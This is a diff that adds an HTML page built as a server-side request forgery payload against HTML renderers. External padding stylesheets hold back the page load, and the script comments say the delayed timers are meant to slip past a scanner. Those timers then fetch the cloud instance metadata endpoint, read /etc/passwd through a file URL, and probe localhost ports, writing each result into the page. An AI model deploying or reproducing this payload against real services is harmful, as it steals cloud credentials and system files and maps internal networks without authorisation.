@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="stylesheet" href="https://chenzhixin13149201-cell.github.io/ssrf-test-assets/padding_10mb.css" />
+<link rel="stylesheet" href="https://chenzhixin13149201-cell.github.io/ssrf-test-assets/padding_10mb.css?v=2" />
+<link rel="stylesheet" href="https://chenzhixin13149201-cell.github.io/ssrf-test-assets/padding_10mb.css?v=3" />
+</head>
+<body>
+<div id="out">LOADING</div>
+<div id="out2">LOADING2</div>
+<div id="out3">LOADING3</div>
+<script>
+// These setTimeout callbacks are NOT executed by the scanner (>= 2s delay)
+// But they WILL execute when the renderer loads this page (if the CSS delays load event)
+
+setTimeout(function(){
+  var r = document.getElementById('out');
+  // Try IMDS
+  var x = new XMLHttpRequest();
+  x.open('GET', 'http://169.254.169.254/latest/meta-data/', false);
+  try { x.send(); r.textContent = 'IMDS:' + x.responseText.substring(0,500); }
+  catch(e) { r.textContent = 'IMDS_ERR:' + e.message; }
+}, 2500);
+
+setTimeout(function(){
+  var r = document.getElementById('out2');
+  // Try file read
+  var x = new XMLHttpRequest();
+  x.open('GET', 'file:///etc/passwd', false);
+  try { x.send(); r.textContent = 'PASSWD:' + x.responseText.substring(0,500); }
+  catch(e) { r.textContent = 'FILE_ERR:' + e.message; }
+}, 3000);
+
+setTimeout(function(){
+  var r = document.getElementById('out3');
+  // Internal port scan
+  var out = '';
+  var targets = [[80,'127.0.0.1'],[8080,'127.0.0.1'],[3000,'127.0.0.1'],[9200,'127.0.0.1']];
+  targets.forEach(function(t){
+    var x = new XMLHttpRequest();
+    x.open('GET', 'http://'+t[1]+':'+t[0]+'/', false);
+    x.timeout = 1000;
+    try { x.send(); out += t[1]+':'+t[0]+'='+x.status+'|'; }
+    catch(e) { out += t[1]+':'+t[0]+'=X|'; }
+  });
+  r.textContent = out;
+}, 3500);
+</script>
+</body>
+</html>
